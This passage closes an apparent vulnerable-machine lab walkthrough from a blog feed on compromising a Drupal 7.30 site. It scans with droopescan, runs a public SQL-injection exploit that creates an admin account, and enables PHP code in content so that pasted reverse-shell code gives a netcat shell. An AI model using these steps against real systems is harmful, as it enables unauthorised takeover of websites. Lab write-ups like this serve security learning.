<p>use droopescan to scan</p>

<p><code>droopescan scan drupal -u http://192.168.41.155/ -t 8</code></p>

<p><img src="/images/blog/vulhub/drooy2/Selection_009.png" title="[title manually exploit [alt text]]" ></p>

<p>now I know the version is 7.30</p>

<p><code>searchsploit drupal</code></p>

<p>find the 34992.txt exploit works.</p>

<p><img src="/images/blog/vulhub/drooy2/Selection_010.png" title="[title manually exploit [alt text]]" ></p>

<p><code>./34992.py -t http://192.168.41.155 -u test -p test</code></p>

<p><img src="/images/blog/vulhub/drooy2/Selection_011.png" title="[title manually exploit [alt text]]" ></p>

<p>this exploit creates an admin account test/test, then in <code>Modules</code>, make sure the <code>PHP filter</code> is selected.</p>

<p><img src="/images/blog/vulhub/drooy2/Selection_012.png" title="[title manually exploit [alt text]]" ></p>

<p>Also in <code>People</code> -> <code>Permissions</code>, check <code>Use the PHP code text format</code></p>

<p><img src="/images/blog/vulhub/drooy2/Selection_013.png" title="[title manually exploit [alt text]]" ></p>

<p>In  <code>configuration</code> -> <code>Content authoring</code> -> <code>Text formats</code>,  need to check administrator box.</p>

<p><img src="/images/blog/vulhub/drooy2/Selection_014.png" title="[title manually exploit [alt text]]" ></p>

<p>Then create a new content (copy and paste reverse shell php code) and use PhP Code in the format, save it, then netcat will get the shell.</p>

<p><img src="/images/blog/vulhub/drooy2/Selection_015.png" title="[title manually exploit [alt text]]" ></p>

<p>Then use same method in the first part of this post to get the root.</p>

<p>DONE</p>
]]></content>
  </entry>
  
</feed>
